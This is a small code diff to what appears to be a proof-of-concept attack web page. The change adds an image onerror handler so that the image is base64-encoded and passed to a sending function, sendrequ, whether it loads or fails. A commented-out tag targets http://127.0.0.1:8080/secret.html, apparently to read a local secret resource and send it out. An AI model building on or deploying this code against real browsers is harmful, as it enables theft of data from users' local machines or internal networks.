@@ -72,6 +72,10 @@ function getFrameContents(){
 		console.log("loaded img");
 		sendrequ(getBase64Image(i));
 	};
+	i.onerror = function(){
+		console.log("error img");
+		sendrequ(getBase64Image(i));
+	};
 	document.body.appendChild(i);
     </script>
     <!--<img id="ttt" src="http://127.0.0.1:8080/secret.html" style="width:1px;height:1px;" onload="sendrequ(getBase64Image(document.getElementById("ttt")))">-->
